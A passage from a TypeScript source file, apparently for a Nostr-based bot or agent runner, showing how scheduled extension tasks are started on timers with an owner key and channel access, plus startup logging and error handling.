          // every channel is missing and re-opens all of them.
          //
          // `ownerPubkey` stays this MACHINE's key — the authority the
          // task acts on behalf of, which is a different question from
          // who owns the workspace. On an unclaimed relay there is no
          // workspace owner, and "" matches no pubkey, so list() comes
          // back empty and ensure() refuses — which is the truth there.
          const nostr = buildTaskNostr() as never;
          // Retried here, so a sentinel that outraced the relay at login
          // recovers on the next tick instead of staying half-dead.
          const owner = await resolveOwner();
          await task.run({
            nostr,
            ownerPubkey: myPubkey,
            channels: makeChannels(nostr, owner ?? ""),
            missedWindow,
          });
        } catch (err) {
          console.warn(`⚠️  scheduled task "${task.name}" failed: ${err instanceof Error ? err.message : err}`);
        }
      };
      const timer = setInterval(() => void tick(), everyMs);
      timer.unref?.();
      void tick(); // once at boot: a due block shouldn't wait a full interval
      console.log(`   ⏱  scheduled task "${task.name}" every ${Math.round(everyMs / 60_000)}m`);
    }
   } catch (err) {
    console.warn(`⚠️  extension tasks unavailable: ${err instanceof Error ? err.message : err}`);
   }
  })();

  console.log(`   watching: DM summons · mention summons · doc-comment summons · notifications · schedules/reminders. Ctrl+C to stop.`);
}

main().catch((err) => {
  console.error("FAILED:", err);
  process.exit(1);
});
